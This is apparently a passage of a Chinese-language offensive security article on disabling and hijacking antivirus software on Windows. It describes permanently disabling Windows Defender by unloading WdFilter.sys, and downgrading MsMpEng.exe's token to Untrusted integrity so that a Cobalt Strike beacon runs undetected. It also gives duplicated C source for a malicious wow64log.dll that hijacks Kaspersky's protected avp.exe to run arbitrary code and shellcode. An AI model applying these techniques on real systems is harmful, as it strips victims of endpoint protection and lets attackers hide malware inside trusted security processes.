      printf("[!] Attempting to unload WdFilter.sys ... ");
然后修改修改和删除Windows Defender的运行必要组件来达到使永远关闭Windows Defender服务的目的
# Toke置为Untrusted
微软文档：
### Windows 令牌
可以将 Windows
令牌视为安全凭证。它说明了你是谁以及你可以做什么。通常，当用户运行一个进程时，该进程使用他们的令牌运行，并且可以执行用户可以执行的任何操作。
令牌中一些最重要的数据包括：
    User identity
    Group membership (e.g.Administrators)
    Privileges (e.g. SeDebugPrivilege)
    Integrity level
令牌是 Windows 授权的关键部分。每当 Windows 线程访问安全对象时，操作系统都会执行安全检查。它将线程的有效令牌与
正在访问的对象的安全描述符进行比较。
在强制完整性控制 (MIC) 中我们知道：
Windows defines four integrity levels: low, medium, high, and system. Standard
users receive medium, elevated users receive high. Processes you start and
objects you create receive your integrity level (medium or high) or low if the
executable file's level is low; system services receive system integrity.
Objects that lack an integrity label are treated as medium by the operating
system; this prevents low-integrity code from modifying unlabeled objects.
Additionally, Windows ensures that processes running with a low integrity
level cannot obtain access to a process which is associated with an app
container.
### 访问令牌
Windows 提供[OpenProcessToken](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken
"OpenProcessToken")API
以启用与进程令牌的交互。MSDN声明必须PROCESS_QUERY_INFORMATION有权使用OpenProcessToken.
由于未受保护的进程只能PROCESS_QUERY_LIMITED_INFORMATION访问PPL进程（注意LIMITED），因此似乎不可能获得PPL进程令牌的句柄。但是，在这种情况下，
MSDN是不正确的。只有 PROCESS_QUERY_LIMITED_INFORMATION，我们也可以成功打开受保护进程的令牌。
通过Process Hacker查看 Windows Defender 的 ( MsMpEng.exe) 令牌，我们看到以下自由访问控制列表 ( DACL
)：
SYSTEM 用户可以完全控制令牌。这意味着，除非有其他机制保护令牌，否则以 SYSTEM
身份运行的线程可以修改令牌,但是在windows中并没有保护令牌的机制。
在Process Hacker中我们可以看到定义的完整性为6种，MsMpfeng启动为System.
其中我们需要注意的是Untrusted的，
具体Windows 完整性控制简介 ：
[https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=2e7efdd7-def6-4b1b-995a-e68b328b6f27&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments](https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=2e7efdd7-def6-4b1b-995a-e68b328b6f27&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments)
**Untrusted** – 匿名登录的进程被自动指定为 Untrusted
Untrusted目前主要应用在浏览器中，也就是Sandboxing，通过创建一个称为沙箱的受限安全上下文来完成的。当沙盒需要在系统上执行特权操作时，例如保存下载的文件，它可以请求非沙盒“代理”进程代表它执行操作,如果沙盒进程被利用，那么有效负载仅对沙盒可访问的资源造成损害的能力。
例如msedge浏览器的进程：
简单来说就是如果为Untrusted，那么进程对计算机资源的访问非常有限。
使用这种技术，攻击者可以强行删除MsMpEng.exe令牌中的所有权限，并将其从系统降低到不受信任的完整性。对不受信任的完整性的削弱会阻止受害者进程访问系统上的大多数安全资源，从而在不终止进程的情况下使进程失去能力。
Cobaltstrike默认生成beacon，直接上线。
对于360等等也是可以这样来进行绕过和利用。
# DLL hijacking在PPL进程中执行任意代码
回看微软文档中关于Protecting Anti-Malware Services的内容时，可以看到具有这样描述的一句话：
    DLL signing requirementsAs  
    mentioned earlier, any non-Windows DLLs that get loaded into the protected service must be signed with the same certificate that was used to sign the anti-malware service.
加载到受保护服务中的任何非 Windows DLL必须使用用于签署反恶意软件服务的相同证书进行签名。那么如果加载的是windows的DLL是否为不用签名？
这里以卡巴斯基的avp.exe进行利用
设置好规则
可以看到加载了一批windows的DLL
后面加载的是卡巴斯基自身的DLL，我们看一下Wow64log.dll
查看一下Wow64log.dll是否在KnownDlls中
wow64log.dll与 WoW64 Windows 机制有关，该机制允许在 64 位 Windows 上运行 32
位程序。该子系统会自动尝试加载它，但是它不存在于任何公共 Windows 版本中
    C:\Windows\System (Windows 95/98/Me)
    C:\WINNT\System32 (Windows NT/2000)
    C:\Windows\System32 (Windows XP,Vista,7,8,10)
    如果是64位文件C:\Windows\SysWOW64
作为管理员，我们可以构造恶意 wow64log.dll 文件复制到 System32 。
例如：
    #include "pch.h"
    #include 
    #include 
    #include 
    #include 
    #include 
    BOOL APIENTRY DllMain(HMODULE hModule, 
    DWORD  ul_reason_for_call, 
    LPVOID lpReserved
    )
    {  STARTUPINFO si = { sizeof(si) }; 
    PROCESS_INFORMATION pi; 
    CreateProcess(TEXT("C:\\Windows\\System32\\calc.exe"), NULL, NULL, NULL, false, 0, NULL, NULL, &si, &pi); 
    switch (ul_reason_for_call) 
    { 
    case DLL_PROCESS_ATTACH:  
    char szFileName[MAX_PATH + 1];  
    GetModuleFileNameA(NULL, szFileName, MAX_PATH + 1);  
    //check if we are injected in an interesting McAfee process   
    if (strstr(szFileName, "avp") != NULL   
    //|| strstr(szFileName, "mcshield") != NULL   
    || strstr(szFileName, "avp.exe") != NULL     
    ) {    
    DisableThreadLibraryCalls(hModule);   
    }  
    else  
    {  
    } 
    case DLL_THREAD_ATTACH: 
    case DLL_THREAD_DETACH: 
    case DLL_PROCESS_DETACH:  
    //log("detach"); 
    break; 
    } 
    return TRUE;
    > #include "pch.h"
    #include 
    #include 
    #include 
    #include 
    #include 
    BOOL APIENTRY DllMain(HMODULE hModule, 
    DWORD  ul_reason_for_call, 
    LPVOID lpReserved
    )
    {  STARTUPINFO si = { sizeof(si) }; 
    PROCESS_INFORMATION pi; 
    CreateProcess(TEXT("C:\\Windows\\System32\\calc.exe"), NULL, NULL, NULL, false, 0, NULL, NULL, &si, &pi); 
    switch (ul_reason_for_call) 
    { 
    case DLL_PROCESS_ATTACH:  
    char szFileName[MAX_PATH + 1];  
    GetModuleFileNameA(NULL, szFileName, MAX_PATH + 1);  
    //check if we are injected in an interesting McAfee process   
    if (strstr(szFileName, "avp") != NULL   
    //|| strstr(szFileName, "mcshield") != NULL   
    || strstr(szFileName, "avp.exe") != NULL     
    ) {    
    DisableThreadLibraryCalls(hModule);   
    }  
    else  
    {  
    } 
    case DLL_THREAD_ATTACH: 
    case DLL_THREAD_DETACH: 
    case DLL_PROCESS_DETACH:  
    //log("detach"); 
    break; 
    } 
    return TRUE;
手动复制在目标文件目录中，然后启动卡巴斯基，可以看到加载了我们的Wow64log.dll
同时PPL的保护依然存在，但是我们已经可以在AVP.exe中执行任意代码，也就是注入了ppl的进程,继承了ppl的保护。
也可以在卡巴安全上下文中执行我们的shellcode 例如：
# CobaltStrike beacon_ppL
国外安全研究员将 PPLDump 漏洞利用移植到 .NET 以将 Cobalt Strike 信标作为 WinTCB PPL 运行。
同样我们也实现了类型的攻击手法
**参考资料**
  * 
  * 
  * 
* * *